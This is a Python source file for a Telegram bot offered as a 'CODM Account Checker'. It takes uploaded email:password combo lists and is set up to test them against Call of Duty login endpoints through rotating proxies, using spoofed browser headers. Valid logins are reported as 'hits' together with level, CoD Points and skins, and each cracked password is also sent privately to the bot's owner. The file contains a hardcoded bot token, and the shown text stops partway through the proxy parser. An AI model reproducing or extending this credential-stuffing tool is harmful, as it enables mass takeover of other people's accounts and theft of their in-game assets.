#!/usr/bin/env python3

from __future__ import annotations

# ─── Standard Library ────────────────────────────────────────────────────────
import os
import re
import sys
import csv
import json
import time
import uuid
import math
import hashlib
import logging
import asyncio
import inspect
import zipfile
import tarfile
import datetime
import platform
import textwrap
import traceback
import threading
import tempfile
import functools
import itertools
import contextlib
import subprocess
import collections
import configparser
import urllib.parse
import urllib.request
import multiprocessing
from io import BytesIO, StringIO
from enum import Enum, auto
from copy import deepcopy
from pathlib import Path
from typing import (
    Any, Callable, Coroutine, DefaultDict, Dict, Generator,
    Generic, Iterable, Iterator, List, Literal, Optional,
    Set, Sequence, Tuple, Type, TypeVar, Union, NamedTuple,
    AsyncGenerator, AsyncIterator,
)
from dataclasses import dataclass, field, asdict
from contextlib import asynccontextmanager, suppress
from collections import defaultdict, deque, OrderedDict, Counter
from abc import ABC, abstractmethod

# ─── Third-Party ─────────────────────────────────────────────────────────────
try:
    import aiohttp
    from aiohttp import ClientSession, ClientTimeout, TCPConnector, ClientError
    from aiohttp import ClientConnectorError, ServerDisconnectedError
    from aiohttp import ContentTypeError
except ImportError:
    print("[!] aiohttp not found. Install: pip install aiohttp")
    sys.exit(1)

try:
    import aiofiles
except ImportError:
    print("[!] aiofiles not found. Install: pip install aiofiles")
    sys.exit(1)

try:
    from telegram import (
        Update, Message, InlineKeyboardButton, InlineKeyboardMarkup,
        BotCommand, InputFile, Document, User as TGUser,
        CallbackQuery, ReplyKeyboardMarkup, ReplyKeyboardRemove,
        KeyboardButton, ForceReply, MessageEntity,
    )
    from telegram.ext import (
        Application, ApplicationBuilder, CommandHandler, MessageHandler,
        CallbackQueryHandler, ConversationHandler, ContextTypes,
        filters, JobQueue, TypeHandler,
    )
    from telegram.error import (
        TelegramError, BadRequest, NetworkError, RetryAfter,
        TimedOut, Forbidden, InvalidToken,
    )
    from telegram.constants import ChatType, ParseMode, MessageLimit
except ImportError:
    print("[!] python-telegram-bot not found. Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class _FakeFore:
        def __getattr__(self, name): return ""
    Fore = Back = Style = _FakeFore()

# ─── Version & Meta ──────────────────────────────────────────────────────────

__version__     = "2.0.0"
__author__      = "@JAYYYTTTTTTTtt"
__bot_name__    = "Insta See Eng"
__description__ = "CODM Account Checker Telegram Bot"
__build_date__  = "2025-05-15"


# ─── Bot Token ────────────────────────────────────────────────────────────────
# Replace with your BotFather token
BOT_TOKEN: str = "8917368310:AAEn37Xx2OO-7qGb4f1ljtvIVMPKEICXSHQ"

# ─── Owner / Admin ────────────────────────────────────────────────────────────
OWNER_USERNAME: str = "JAYYYTTTTTTTtt"                      # without @
OWNER_ID: int       = int(os.getenv("OWNER_ID", "8069463825"))  # Set your Telegram user ID

# ─── Checker Settings ─────────────────────────────────────────────────────────
MAX_WORKERS:       int   = 10        # Concurrent check threads
QUEUE_MAX_SIZE:    int   = 5000      # Max accounts in queue at once
REQUEST_TIMEOUT:   int   = 20        # Seconds per HTTP request
MAX_RETRIES:       int   = 3         # Retries per account on failure
RETRY_DELAY:       float = 1.5       # Seconds between retries

# ─── Rate Limiting ────────────────────────────────────────────────────────────
USER_COOLDOWN_SEC:    int = 60        # Seconds user must wait between uploads
MAX_ACCOUNTS_PER_JOB: int = 50_000   # Max combo lines per file
FREE_MAX_ACCOUNTS:    int = 10_000   # Free users limited to this
PREMIUM_MAX_ACCOUNTS: int = 50_000   # Premium users limit

# ─── Output / Storage ─────────────────────────────────────────────────────────
RESULTS_DIR:   str = "results"
LOGS_DIR:      str = "logs"
DATA_DIR:      str = "data"
PROXIES_FILE:  str = "proxies.txt"
PREMIUM_FILE:  str = "data/premium.json"
USERS_FILE:    str = "data/users.json"
STATS_FILE:    str = "data/stats.json"
BANNED_FILE:   str = "data/banned.json"

# ─── Telegram UI ──────────────────────────────────────────────────────────────
PROGRESS_UPDATE_INTERVAL: float = 3.0   # Seconds between progress message edits
MAX_MESSAGE_LENGTH:       int   = 4096

# ─── Activision / CODM API ────────────────────────────────────────────────────
ACTIVISION_BASE_URL:    str = "https://my.callofduty.com"
ACTIVISION_LOGIN_URL:   str = "https://profile.callofduty.com/cod/login"
ACTIVISION_API_URL:     str = "https://my.callofduty.com/api/papi-client"
ACTIVISION_SSO_URL:     str = "https://profile.callofduty.com/cod/sso"
ACTIVISION_REGISTER:    str = "https://profile.callofduty.com/do/registerDevice"
CODM_API_BASE:          str = "https://api.minttm.com"

# ─── Headers (Realistic Browser) ──────────────────────────────────────────────
DEFAULT_HEADERS: Dict[str, str] = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/123.0.0.0 Safari/537.36"
    ),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Origin": "https://my.callofduty.com",
    "Referer": "https://my.callofduty.com/",
    "Sec-Ch-Ua": '"Chromium";v="123", "Not:A-Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

# =============================================================================
#   ENUMS & STATUS CODES
# =============================================================================

class AccountStatus(str, Enum):
    HIT         = "HIT"
    BAD         = "BAD"
    ERROR       = "ERROR"
    RETRY       = "RETRY"
    INVALID_FMT = "INVALID_FORMAT"
    BANNED      = "BANNED_ACCOUNT"
    LOCKED      = "LOCKED"
    NO_CODM     = "NO_CODM"
    RATE_LIMIT  = "RATE_LIMITED"
    TIMEOUT     = "TIMEOUT"
    UNKNOWN     = "UNKNOWN"

class JobStatus(str, Enum):
    QUEUED     = "QUEUED"
    RUNNING    = "RUNNING"
    PAUSED     = "PAUSED"
    DONE       = "DONE"
    CANCELLED  = "CANCELLED"
    FAILED     = "FAILED"

class UserTier(str, Enum):
    FREE    = "FREE"
    PREMIUM = "PREMIUM"
    ADMIN   = "ADMIN"
    OWNER   = "OWNER"
    BANNED  = "BANNED"

class ProxyType(str, Enum):
    HTTP    = "http"
    HTTPS   = "https"
    SOCKS4  = "socks4"
    SOCKS5  = "socks5"
    NONE    = "none"

# =============================================================================
#   DATA STRUCTURES
# =============================================================================

@dataclass
class Proxy:
    host:     str
    port:     int
    ptype:    ProxyType = ProxyType.HTTP
    username: Optional[str] = None
    password: Optional[str] = None
    success:  int = 0
    failure:  int = 0
    speed_ms: float = 0.0

    @property
    def url(self) -> str:
        auth = ""
        if self.username and self.password:
            auth = f"{self.username}:{self.password}@"
        return f"{self.ptype.value}://{auth}{self.host}:{self.port}"

    @property
    def score(self) -> float:
        total = self.success + self.failure
        if total == 0:
            return 0.5
        rate = self.success / total
        speed_bonus = max(0.0, 1.0 - (self.speed_ms / 5000.0))
        return (rate * 0.7) + (speed_bonus * 0.3)

    def record_success(self, ms: float) -> None:
        self.success += 1
        # Rolling average speed
        self.speed_ms = (self.speed_ms * 0.8) + (ms * 0.2)

    def record_failure(self) -> None:
        self.failure += 1

    def __str__(self) -> str:
        return f"{self.ptype.value}://{self.host}:{self.port}"


@dataclass
class AccountResult:
    raw:       str
    username:  str
    password:  str
    status:    AccountStatus
    detail:    str                = ""
    player_id: str                = ""
    level:     int                = 0
    rank:      str                = ""
    cp:        int                = 0                # CoD Points
    skins:     int                = 0
    clan:      str                = ""
    platform:  str                = ""
    region:    str                = ""
    last_seen: str                = ""
    checked_at: str               = field(
        default_factory=lambda: datetime.datetime.utcnow().isoformat()
    )
    proxy_used: str               = ""
    elapsed_ms: float             = 0.0
    extra:      Dict[str, Any]    = field(default_factory=dict)

    @property
    def is_hit(self) -> bool:
        return self.status == AccountStatus.HIT

    @property
    def is_bad(self) -> bool:
        return self.status in (
            AccountStatus.BAD, AccountStatus.INVALID_FMT,
            AccountStatus.BANNED, AccountStatus.NO_CODM,
        )

    @property
    def is_error(self) -> bool:
        return self.status in (
            AccountStatus.ERROR, AccountStatus.TIMEOUT,
            AccountStatus.RATE_LIMIT, AccountStatus.UNKNOWN,
        )

    def to_line(self) -> str:
        """Format a single combo line for output."""
        if self.is_hit:
            parts = [
                f"{self.username}:{self.password}",
                f"Level:{self.level}",
                f"Rank:{self.rank or 'N/A'}",
                f"CP:{self.cp}",
                f"Skins:{self.skins}",
            ]
            if self.clan:
                parts.append(f"Clan:{self.clan}")
            if self.platform:
                parts.append(f"Platform:{self.platform}")
            return " | ".join(parts)
        return f"{self.username}:{self.password} | {self.status.value} | {self.detail}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "raw": self.raw,
            "username": self.username,
            "password": self.password,
            "status": self.status.value,
            "detail": self.detail,
            "player_id": self.player_id,
            "level": self.level,
            "rank": self.rank,
            "cp": self.cp,
            "skins": self.skins,
            "clan": self.clan,
            "platform": self.platform,
            "region": self.region,
            "last_seen": self.last_seen,
            "checked_at": self.checked_at,
            "elapsed_ms": self.elapsed_ms,
        }


@dataclass
class CheckJob:
    job_id:     str
    user_id:    int
    chat_id:    int
    msg_id:     int                    # Progress message ID
    accounts:   List[Tuple[str, str]]  # (username, password)
    total:      int                    = 0
    checked:    int                    = 0
    hits:       int                    = 0
    bad:        int                    = 0
    errors:     int                    = 0
    retries:    int                    = 0
    status:     JobStatus              = JobStatus.QUEUED
    created_at: float                  = field(default_factory=time.time)
    started_at: Optional[float]        = None
    finished_at: Optional[float]       = None
    results:    List[AccountResult]    = field(default_factory=list)
    cancel_event: asyncio.Event        = field(default_factory=asyncio.Event)
    pause_event:  asyncio.Event        = field(default_factory=lambda: asyncio.Event())
    task:         Optional[asyncio.Task] = None

    def __post_init__(self):
        self.total = len(self.accounts)
        self.pause_event.set()   # starts unpaused

    @property
    def elapsed(self) -> float:
        if self.started_at is None:
            return 0.0
        end = self.finished_at or time.time()
        return end - self.started_at

    @property
    def speed(self) -> float:
        """Accounts per second."""
        if self.elapsed < 0.1:
            return 0.0
        return self.checked / self.elapsed

    @property
    def eta_seconds(self) -> float:
        remaining = self.total - self.checked
        if self.speed < 0.01:
            return 9999.0
        return remaining / self.speed

    @property
    def progress_pct(self) -> float:
        if self.total == 0:
            return 100.0
        return (self.checked / self.total) * 100.0

    @property
    def hit_results(self) -> List[AccountResult]:
        return [r for r in self.results if r.is_hit]

    @property
    def bad_results(self) -> List[AccountResult]:
        return [r for r in self.results if r.is_bad]

    @property
    def error_results(self) -> List[AccountResult]:
        return [r for r in self.results if r.is_error]


@dataclass
class UserProfile:
    user_id:    int
    username:   str
    first_name: str
    tier:       UserTier   = UserTier.FREE
    total_jobs: int        = 0
    total_checked: int     = 0
    total_hits: int        = 0
    joined_at:  float      = field(default_factory=time.time)
    last_seen:  float      = field(default_factory=time.time)
    last_upload: float     = 0.0
    banned_reason: str     = ""
    premium_until: float   = 0.0
    custom_workers: int    = 0

    @property
    def is_banned(self) -> bool:
        return self.tier == UserTier.BANNED

    @property
    def is_premium(self) -> bool:
        if self.tier in (UserTier.PREMIUM, UserTier.ADMIN, UserTier.OWNER):
            return True
        if self.premium_until and self.premium_until > time.time():
            return True
        return False

    @property
    def is_admin(self) -> bool:
        return self.tier in (UserTier.ADMIN, UserTier.OWNER)

    @property
    def max_accounts(self) -> int:
        if self.is_admin:
            return PREMIUM_MAX_ACCOUNTS
        if self.is_premium:
            return PREMIUM_MAX_ACCOUNTS
        return FREE_MAX_ACCOUNTS

    @property
    def cooldown_remaining(self) -> float:
        if self.is_admin:
            return 0.0
        elapsed = time.time() - self.last_upload
        remaining = USER_COOLDOWN_SEC - elapsed
        return max(0.0, remaining)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "user_id": self.user_id,
            "username": self.username,
            "first_name": self.first_name,
            "tier": self.tier.value,
            "total_jobs": self.total_jobs,
            "total_checked": self.total_checked,
            "total_hits": self.total_hits,
            "joined_at": self.joined_at,
            "last_seen": self.last_seen,
            "last_upload": self.last_upload,
            "banned_reason": self.banned_reason,
            "premium_until": self.premium_until,
            "custom_workers": self.custom_workers,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "UserProfile":
        return cls(
            user_id=d["user_id"],
            username=d.get("username", ""),
            first_name=d.get("first_name", ""),
            tier=UserTier(d.get("tier", "FREE")),
            total_jobs=d.get("total_jobs", 0),
            total_checked=d.get("total_checked", 0),
            total_hits=d.get("total_hits", 0),
            joined_at=d.get("joined_at", time.time()),
            last_seen=d.get("last_seen", time.time()),
            last_upload=d.get("last_upload", 0.0),
            banned_reason=d.get("banned_reason", ""),
            premium_until=d.get("premium_until", 0.0),
            custom_workers=d.get("custom_workers", 0),
        )


@dataclass
class GlobalStats:
    total_checked:    int   = 0
    total_hits:       int   = 0
    total_bad:        int   = 0
    total_errors:     int   = 0
    total_jobs:       int   = 0
    total_users:      int   = 0
    bot_started_at:   float = field(default_factory=time.time)
    last_hit_at:      float = 0.0
    last_hit_account: str   = ""

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.bot_started_at

    @property
    def hit_rate(self) -> float:
        if self.total_checked == 0:
            return 0.0
        return self.total_hits / self.total_checked * 100.0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "total_checked": self.total_checked,
            "total_hits": self.total_hits,
            "total_bad": self.total_bad,
            "total_errors": self.total_errors,
            "total_jobs": self.total_jobs,
            "total_users": self.total_users,
            "bot_started_at": self.bot_started_at,
            "last_hit_at": self.last_hit_at,
            "last_hit_account": self.last_hit_account,
        }

    @classmethod
    def from_dict(cls, d: Dict[str, Any]) -> "GlobalStats":
        obj = cls()
        for k, v in d.items():
            if hasattr(obj, k):
                setattr(obj, k, v)
        return obj


# =============================================================================
#   LOGGING SETUP
# =============================================================================

def setup_logging() -> logging.Logger:
    Path(LOGS_DIR).mkdir(parents=True, exist_ok=True)
    log_file = Path(LOGS_DIR) / f"bot_{datetime.date.today()}.log"

    fmt = "%(asctime)s | %(levelname)-8s | %(name)s | %(message)s"
    datefmt = "%Y-%m-%d %H:%M:%S"

    handlers: List[logging.Handler] = [
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(log_file, encoding="utf-8"),
    ]

    logging.basicConfig(level=logging.INFO, format=fmt, datefmt=datefmt, handlers=handlers)
    logging.getLogger("httpx").setLevel(logging.WARNING)
    logging.getLogger("httpcore").setLevel(logging.WARNING)
    logging.getLogger("aiohttp").setLevel(logging.WARNING)
    logging.getLogger("telegram").setLevel(logging.WARNING)

    return logging.getLogger("insta_see_eng")


logger = setup_logging()


# =============================================================================
#   ANIMATION ENGINE
# =============================================================================

class AnimationEngine:
    """
    Provides text-based animation frames for Telegram messages.
    All animations cycle through ASCII art / emoji sequences.
    """

    # Loading spinners
    SPINNER_CLASSIC: List[str]  = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    SPINNER_CIRCLE:  List[str]  = ["◐", "◓", "◑", "◒"]
    SPINNER_ARROW:   List[str]  = ["←", "↖", "↑", "↗", "→", "↘", "↓", "↙"]
    SPINNER_BOX:     List[str]  = ["▖", "▘", "▝", "▗"]
    SPINNER_GROW:    List[str]  = ["▏", "▎", "▍", "▌", "▋", "▊", "▉", "█", "▉", "▊", "▋", "▌", "▍", "▎"]
    SPINNER_PULSE:   List[str]  = ["●", "◉", "○", "◉"]
    SPINNER_GUN:     List[str]  = ["🔫 .", "🔫 ..", "🔫 ...", "💥"]
    SPINNER_RADAR:   List[str]  = ["📡", "📡·", "📡··", "📡···"]

    # Progress bar chars
    BAR_FILLED  = "█"
    BAR_EMPTY   = "░"
    BAR_HEAD    = "▓"

    # Status badges
    BADGE_HIT     = "✅"
    BADGE_BAD     = "❌"
    BADGE_ERROR   = "⚠️"
    BADGE_CHECK   = "🔍"
    BADGE_WAIT    = "⏳"
    BADGE_DONE    = "🏁"
    BADGE_FIRE    = "🔥"
    BADGE_SKULL   = "💀"
    BADGE_CROWN   = "👑"
    BADGE_LOCK    = "🔒"
    BADGE_UNLOCK  = "🔓"
    BADGE_STAR    = "⭐"
    BADGE_DIAMOND = "💎"
    BADGE_BOLT    = "⚡"
    BADGE_SPEED   = "🚀"
    BADGE_QUEUE   = "📋"
    BADGE_BOT     = "🤖"

    # Title art frames (cycling)
    TITLE_FRAMES: List[str] = [
        "╔══ INSTA SEE ENG ══╗",
        "║  INSTA SEE ENG  ║",
        "╚══ INSTA SEE ENG ══╝",
        "╔══ INSTA SEE ENG ══╗",
    ]

    SCAN_FRAMES: List[str] = [
        "[ ■□□□□□□□□□ ]  10%",
        "[ ■■□□□□□□□□ ]  20%",
        "[ ■■■□□□□□□□ ]  30%",
        "[ ■■■■□□□□□□ ]  40%",
        "[ ■■■■■□□□□□ ]  50%",
        "[ ■■■■■■□□□□ ]  60%",
        "[ ■■■■■■■□□□ ]  70%",
        "[ ■■■■■■■■□□ ]  80%",
        "[ ■■■■■■■■■□ ]  90%",
        "[ ■■■■■■■■■■ ] 100%",
    ]

    WAVE_FRAMES: List[str] = [
        "〰〰〰〰〰",
        "〜〜〜〜〜",
        "≈≈≈≈≈",
        "~~~〜〜",
        "〜〜~~~",
    ]

    @staticmethod
    def build_progress_bar(pct: float, width: int = 20) -> str:
        """Build a Unicode progress bar."""
        filled = int(round(pct / 100.0 * width))
        filled = max(0, min(width, filled))
        empty  = width - filled
        bar = AnimationEngine.BAR_FILLED * filled + AnimationEngine.BAR_EMPTY * empty
        return f"[{bar}]"

    @staticmethod
    def format_time(seconds: float) -> str:
        """Convert seconds to human-readable time."""
        if seconds >= 3600:
            h = int(seconds // 3600)
            m = int((seconds % 3600) // 60)
            return f"{h}h {m}m"
        if seconds >= 60:
            m = int(seconds // 60)
            s = int(seconds % 60)
            return f"{m}m {s}s"
        return f"{int(seconds)}s"

    @staticmethod
    def format_speed(cps: float) -> str:
        """Format checks-per-second."""
        if cps >= 1000:
            return f"{cps/1000:.1f}k/s"
        return f"{cps:.1f}/s"

    @staticmethod
    def get_spinner_frame(spinner: List[str], tick: int) -> str:
        return spinner[tick % len(spinner)]

    @staticmethod
    def build_progress_message(job: "CheckJob", tick: int = 0) -> str:
        """Build the full animated progress message."""
        spin = AnimationEngine.get_spinner_frame(AnimationEngine.SPINNER_CLASSIC, tick)
        pct  = job.progress_pct
        bar  = AnimationEngine.build_progress_bar(pct)
        eta  = AnimationEngine.format_time(job.eta_seconds) if job.eta_seconds < 9000 else "calculating..."
        spd  = AnimationEngine.format_speed(job.speed)
        elapsed = AnimationEngine.format_time(job.elapsed)

        status_line = {
            JobStatus.QUEUED:    "⏳ In queue...",
            JobStatus.RUNNING:   f"{spin} Checking...",
            JobStatus.PAUSED:    "⏸️ Paused",
            JobStatus.DONE:      "🏁 Completed!",
            JobStatus.CANCELLED: "🚫 Cancelled",
            JobStatus.FAILED:    "💥 Failed",
        }.get(job.status, "⚙️ Working...")

        lines = [
            f"🤖 **Insta See Eng** — CODM Checker",
            f"{'─' * 34}",
            f"",
            f"{status_line}",
            f"",
            f"{bar} `{pct:.1f}%`",
            f"",
            f"✅ Hits    : `{job.hits}`",
            f"❌ Bad     : `{job.bad}`",
            f"⚠️ Errors  : `{job.errors}`",
            f"📊 Checked : `{job.checked}` / `{job.total}`",
            f"",
            f"⚡ Speed   : `{spd}`",
            f"⏱️ Elapsed : `{elapsed}`",
            f"🕐 ETA     : `{eta}`",
            f"",
            f"🆔 Job     : `{job.job_id[:8]}`",
            f"{'─' * 34}",
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
        ]
        return "\n".join(lines)

    @staticmethod
    def build_result_message(job: "CheckJob") -> str:
        """Build the final results summary message."""
        elapsed = AnimationEngine.format_time(job.elapsed)
        hit_rate = (job.hits / job.total * 100.0) if job.total > 0 else 0.0
        bar = AnimationEngine.build_progress_bar(hit_rate, width=15)

        quality = "🔥 GREAT" if hit_rate > 5 else ("✨ OK" if hit_rate > 1 else "💀 DEAD")

        lines = [
            f"",
            f"╔══════════════════════════╗",
            f"║  🏁  JOB COMPLETE  🏁   ║",
            f"╚══════════════════════════╝",
            f"",
            f"🤖 **Insta See Eng** — Results",
            f"{'─' * 34}",
            f"",
            f"📦 Total    : `{job.total}`",
            f"✅ Hits     : `{job.hits}` ({hit_rate:.2f}%)",
            f"❌ Bad      : `{job.bad}`",
            f"⚠️ Errors   : `{job.errors}`",
            f"",
            f"Hit Rate: {bar} `{hit_rate:.2f}%`",
            f"Quality : {quality}",
            f"",
            f"⏱️ Time  : `{elapsed}`",
            f"⚡ Speed : `{AnimationEngine.format_speed(job.speed)}`",
            f"",
            f"{'─' * 34}",
        ]

        if job.hits > 0:
            lines += [
                f"",
                f"🔥 **Top Hits:**",
            ]
            for r in job.hit_results[:5]:
                lines.append(
                    f"  └ `{r.username}` | Lv.{r.level} | {r.rank or 'Unranked'} | {r.cp}CP"
                )

        lines += [
            f"",
            f"📁 Files sent below ↓",
            f"{'─' * 34}",
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
        ]

        return "\n".join(lines)

    @staticmethod
    def build_welcome_message() -> str:
        return (
            f"```\n"
            f"╔══════════════════════════════╗\n"
            f"║                              ║\n"
            f"║     INSTA SEE ENG  🤖        ║\n"
            f"║   CODM Account Checker       ║\n"
            f"║                              ║\n"
            f"║   Owner : @JAYYYTTTTTTTtt    👑      ║\n"
            f"║                              ║\n"
            f"╚══════════════════════════════╝\n"
            f"```\n"
            f"\n"
            f"🔥 **Welcome to Insta See Eng!**\n"
            f"\n"
            f"**How to use:**\n"
            f"1️⃣ Upload a `.txt` combo file\n"
            f"   Format: `email:password` or `user:pass`\n"
            f"2️⃣ Bot auto-processes the queue\n"
            f"3️⃣ Receive results in 3 files:\n"
            f"   • ✅ `hits.txt` — Valid accounts\n"
            f"   • ❌ `bad.txt` — Invalid accounts\n"
            f"   • ⚠️ `errors.txt` — Errors\n"
            f"\n"
            f"**Commands:**\n"
            f"/start — Show this message\n"
            f"/status — Your queue status\n"
            f"/cancel — Cancel your current job\n"
            f"/stats — Bot global statistics\n"
            f"/help — Full help guide\n"
            f"\n"
            f"{'─' * 34}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def build_help_message() -> str:
        return (
            f"🤖 **Insta See Eng — Help Guide**\n"
            f"{'─' * 34}\n"
            f"\n"
            f"**📂 Uploading Combos:**\n"
            f"• Send a `.txt` file with one account per line\n"
            f"• Supported formats:\n"
            f"  - `email@host.com:password`\n"
            f"  - `username:password`\n"
            f"  - `email:password:extra` (extra ignored)\n"
            f"• Max lines: `{FREE_MAX_ACCOUNTS:,}` (free) / `{PREMIUM_MAX_ACCOUNTS:,}` (premium)\n"
            f"\n"
            f"**🔄 Queue System:**\n"
            f"• Jobs are processed in order\n"
            f"• Cooldown: {USER_COOLDOWN_SEC}s between uploads\n"
            f"• Live progress updates every {int(PROGRESS_UPDATE_INTERVAL)}s\n"
            f"\n"
            f"**📊 What We Check:**\n"
            f"• ✅ Account validity\n"
            f"• 🎮 CODM game presence\n"
            f"• ⭐ Player level\n"
            f"• 🏆 Rank / season rank\n"
            f"• 💎 CoD Points balance\n"
            f"• 🎨 Skin count\n"
            f"• 👥 Clan membership\n"
            f"\n"
            f"**📋 Commands:**\n"
            f"`/start` — Welcome message\n"
            f"`/status` — Your current job status\n"
            f"`/cancel` — Cancel active job\n"
            f"`/stats` — Global bot stats\n"
            f"`/proxies` — Check proxy pool status\n"
            f"`/help` — This message\n"
            f"\n"
            f"**⚙️ Admin Commands:**\n"
            f"`/admin` — Admin panel\n"
            f"`/addpremium <id>` — Grant premium\n"
            f"`/ban <id> <reason>` — Ban user\n"
            f"`/unban <id>` — Unban user\n"
            f"`/broadcast <msg>` — Message all users\n"
            f"`/setworkers <n>` — Change worker count\n"
            f"`/addproxy <proxy>` — Add a proxy\n"
            f"\n"
            f"{'─' * 34}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def build_queue_position_message(position: int, queue_size: int, eta: float) -> str:
        bar = AnimationEngine.build_progress_bar(
            (1.0 - position / max(queue_size, 1)) * 100.0, width=15
        )
        return (
            f"📋 **Job Queued!**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"Queue Position: `#{position}` of `{queue_size}`\n"
            f"{bar}\n"
            f"\n"
            f"⏳ Estimated wait: `{AnimationEngine.format_time(eta)}`\n"
            f"\n"
            f"• Your job will start automatically\n"
            f"• You'll get live progress updates\n"
            f"• Use /cancel to stop anytime\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def build_error_message(error: str) -> str:
        return (
            f"⚠️ **Error**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"```\n{error}\n```\n"
            f"\n"
            f"Please try again or contact @JAYYYTTTTTTTtt\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def build_stats_message(stats: "GlobalStats", active_jobs: int, queued: int) -> str:
        uptime = AnimationEngine.format_time(stats.uptime_seconds)
        hit_rate = f"{stats.hit_rate:.2f}%"
        last_hit = (
            datetime.datetime.fromtimestamp(stats.last_hit_at).strftime("%Y-%m-%d %H:%M")
            if stats.last_hit_at else "Never"
        )
        return (
            f"📊 **Insta See Eng — Statistics**\n"
            f"{'─' * 34}\n"
            f"\n"
            f"🔍 Total Checked : `{stats.total_checked:,}`\n"
            f"✅ Total Hits    : `{stats.total_hits:,}`\n"
            f"❌ Total Bad     : `{stats.total_bad:,}`\n"
            f"⚠️ Total Errors  : `{stats.total_errors:,}`\n"
            f"\n"
            f"🎯 Hit Rate      : `{hit_rate}`\n"
            f"📦 Total Jobs    : `{stats.total_jobs:,}`\n"
            f"👤 Total Users   : `{stats.total_users:,}`\n"
            f"\n"
            f"🔄 Active Jobs   : `{active_jobs}`\n"
            f"📋 Queued Jobs   : `{queued}`\n"
            f"\n"
            f"🕐 Last Hit      : `{last_hit}`\n"
            f"⏱️ Uptime        : `{uptime}`\n"
            f"\n"
            f"{'─' * 34}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def build_hit_notification(result: "AccountResult") -> str:
        """Private notification to owner when a hit is found."""
        return (
            f"🔥 **HIT FOUND!**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"👤 Account : `{result.username}`\n"
            f"🔑 Password: `{result.password}`\n"
            f"\n"
            f"⭐ Level   : `{result.level}`\n"
            f"🏆 Rank    : `{result.rank or 'Unranked'}`\n"
            f"💎 CP      : `{result.cp}`\n"
            f"🎨 Skins   : `{result.skins}`\n"
            f"👥 Clan    : `{result.clan or 'None'}`\n"
            f"🌍 Platform: `{result.platform or 'Unknown'}`\n"
            f"\n"
            f"🕐 Time    : `{result.checked_at}`\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )

    @staticmethod
    def build_account_detail(result: "AccountResult") -> str:
        """Detailed view of a single account result."""
        if result.is_hit:
            return (
                f"✅ **Account Details**\n"
                f"{'─' * 30}\n"
                f"\n"
                f"👤 Login   : `{result.username}:{result.password}`\n"
                f"🆔 ID      : `{result.player_id or 'N/A'}`\n"
                f"\n"
                f"⭐ Level   : `{result.level}`\n"
                f"🏆 Rank    : `{result.rank or 'Unranked'}`\n"
                f"💎 CP      : `{result.cp}`\n"
                f"🎨 Skins   : `{result.skins}`\n"
                f"👥 Clan    : `{result.clan or 'None'}`\n"
                f"🌍 Platform: `{result.platform or 'Unknown'}`\n"
                f"🗺️ Region  : `{result.region or 'Unknown'}`\n"
                f"📅 Seen    : `{result.last_seen or 'Unknown'}`\n"
                f"\n"
                f"⚡ {result.elapsed_ms:.0f}ms\n"
            )
        return (
            f"❌ **Account: {result.status.value}**\n"
            f"👤 `{result.username}:{result.password}`\n"
            f"ℹ️ {result.detail}\n"
        )


# =============================================================================
#   PROXY MANAGER
# =============================================================================

class ProxyManager:
    """
    Manages a rotating pool of proxies for HTTP requests.
    Tracks success/failure rates and prefers faster, more reliable proxies.
    """

    def __init__(self) -> None:
        self._proxies:  List[Proxy] = []
        self._lock:     asyncio.Lock = asyncio.Lock()
        self._index:    int = 0
        self._no_proxy: bool = True
        self._last_reload: float = 0.0

    async def load_from_file(self, path: str) -> int:
        """Load proxies from a text file. Returns count loaded."""
        try:
            async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = await f.read()
        except FileNotFoundError:
            logger.info(f"No proxy file at {path}")
            return 0

        loaded = 0
        for line in content.splitlines():
            proxy = self._parse_proxy_line(line.strip())
            if proxy:
                self._proxies.append(proxy)
                loaded += 1

        if loaded > 0:
            self._no_proxy = False
            logger.info(f"Loaded {loaded} proxies from {path}")
        else:
            logger.warning("No valid proxies found — running without proxies")

        self._last_reload = time.time()
        return loaded

    def _parse_proxy_line(self, line: str) -> Optional[Proxy]:
        """Parse a proxy line in various formats."""
        if not line or line.startswith("#"):
            return None

        # Format: type://user:pass@host:port or type://host:port
        for ptype in ProxyType:
            if ptype == ProxyType.NONE:
                continue
            prefix = f"{ptype.value}://"
            if line.lower().startswith(prefix):
                rest = line[len(prefix):]
                return self._parse_host_port(rest, ptype)

        # Format: host:port or host:port:user:pass
        return self._parse_host_port(line, ProxyType.HTTP)

    def _parse_host_port(self, text: str, ptype: ProxyType) -> Optional[Proxy]:
        try:
            # user:pass@host:port
            if "@" in text:
                auth, hostport = text.rsplit("@", 1)
